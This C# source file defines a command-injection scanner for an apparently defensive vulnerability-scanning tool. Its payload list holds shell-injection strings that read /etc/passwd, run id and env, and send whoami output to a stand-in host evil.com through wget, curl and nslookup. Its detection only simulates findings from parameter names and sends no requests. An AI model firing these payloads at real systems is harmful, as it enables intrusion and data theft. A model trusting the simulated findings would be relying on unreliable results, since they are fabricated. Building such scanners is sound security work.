using SentinelVulnScan.Models;
using Serilog;

namespace SentinelVulnScan.Scanners;

public class CommandInjectionScanner : BaseScanner
{
    private readonly List<string> _payloads = new()
    {
        "; ls -la",
        "& dir",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; ping -c 5 evil.com",
        "& ping -n 5 evil.com",
        "| whoami",
        "; sleep 5",
        "& timeout 5",
        "; id",
        "| id",
        "& id",
        "; echo $PATH",
        "| echo $PATH",
        "; env",
        "& set",
        "| type C:\\Windows\\win.ini", // Windows specific
        "; uname -a",  // Unix specific
        "& systeminfo", // Windows specific
        // Time-based payloads
        "& ping -n 15 127.0.0.1",
        "; sleep 15",
        "`sleep 15`",
        "$(sleep 15)",
        // Blind command injection
        "& nslookup uniqueid.evil.com",
        "; wget http://evil.com?data=$(whoami)",
        "| curl http://evil.com?data=$(whoami)"
    };
    
    public CommandInjectionScanner(Core.Configuration config) : base(config)
    {
    }
    
    public override string GetScannerName() => "CommandInjection";
    
    protected override string GetRemediationAdvice() => 
        "Avoid passing user input to system commands. " +
        "If necessary, implement strict input validation and whitelisting. " +
        "Use language-specific libraries instead of system commands. " +
        "Run with reduced privileges. " +
        "Implement proper error handling that doesn't expose system information.";
    
    protected override string GetCweId() => "CWE-78";
    
    protected override string GetImpactDescription() => 
        "Command Injection can lead to execution of arbitrary commands on the host system, " +
        "potentially resulting in complete system compromise, data theft, and service disruption. " +
        "An attacker can use this vulnerability to gain unauthorized access to the underlying server.";
    
    public override async Task<List<Vulnerability>> ScanAsync(Target target)
    {
        var vulnerabilities = new List<Vulnerability>();
        
        foreach (var endpoint in target.Endpoints)
        {
            if (endpoint.Method.Equals("GET", StringComparison.OrdinalIgnoreCase))
            {
                await ScanGetParametersAsync(endpoint, vulnerabilities);
            }
            else if (endpoint.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                await ScanPostParametersAsync(endpoint, vulnerabilities);
            }
        }
        
        return vulnerabilities;
    }
    
    private async Task ScanGetParametersAsync(Endpoint endpoint, List<Vulnerability> vulnerabilities)
    {
        var uri = new Uri(endpoint.Url);
        var queryParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
        
        foreach (var key in queryParams.AllKeys)
        {
            if (string.IsNullOrEmpty(key)) continue;
            
            foreach (var payload in _payloads)
            {
                try
                {
                    // Clone the query parameters
                    var modifiedParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
                    modifiedParams[key] = payload;
                    
                    // Build the modified URL
                    var uriBuilder = new UriBuilder(uri)
                    {
                        Query = modifiedParams.ToString() ?? string.Empty
                    };
                    
                    var modifiedUrl = uriBuilder.Uri.ToString();
                    
                    // In a real implementation, this would make an HTTP request to the modified URL
                    // and analyze the response for signs of command execution
                    
                    // For now, we'll simulate a vulnerability for demonstration
                    if (key == "cmd" || key == "command" || key == "exec" || key == "run" || 
                        key == "ping" || key == "host" || key == "ip" || key == "dns")
                    {
                        var vulnerability = CreateVulnerability(
                            endpoint.Url,
                            "GET",
                            key,
                            payload,
                            "Simulated response contains command output that indicates successful command execution",
                            SeverityLevel.Critical);
                        
                        vulnerabilities.Add(vulnerability);
                        Log.Warning("Found Command Injection vulnerability in parameter {Param} at {Url}", 
                            key, endpoint.Url);
                    }
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Error testing Command Injection for parameter {Param} at {Url}",
                        key, endpoint.Url);
                }
                
                // Add a small delay to avoid overwhelming the target
                await Task.Delay(Config.RequestDelay);
            }
        }
    }
    
    private async Task ScanPostParametersAsync(Endpoint endpoint, List<Vulnerability> vulnerabilities)
    {
        foreach (var parameter in endpoint.Parameters)
        {
            foreach (var payload in _payloads)
            {
                try
                {
                    // In a real implementation, this would create a POST request with the payload
                    // and analyze the response for signs of command execution
                    
                    // For now, we'll simulate a vulnerability for demonstration
                    if (parameter.Name.Contains("cmd", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("command", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("exec", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("run", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("ping", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("host", StringComparison.OrdinalIgnoreCase))
                    {
                        var vulnerability = CreateVulnerability(
                            endpoint.Url,
                            "POST",
                            parameter.Name,
                            payload,
                            "Simulated response contains command output that indicates successful command execution",
                            SeverityLevel.Critical);
                        
                        vulnerabilities.Add(vulnerability);
                        Log.Warning("Found Command Injection vulnerability in parameter {Param} at {Url}", 
                            parameter.Name, endpoint.Url);
                    }
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Error testing Command Injection for parameter {Param} at {Url}",
                        parameter.Name, endpoint.Url);
                }
                
                // Add a small delay to avoid overwhelming the target
                await Task.Delay(Config.RequestDelay);
            }
        }
    }
}
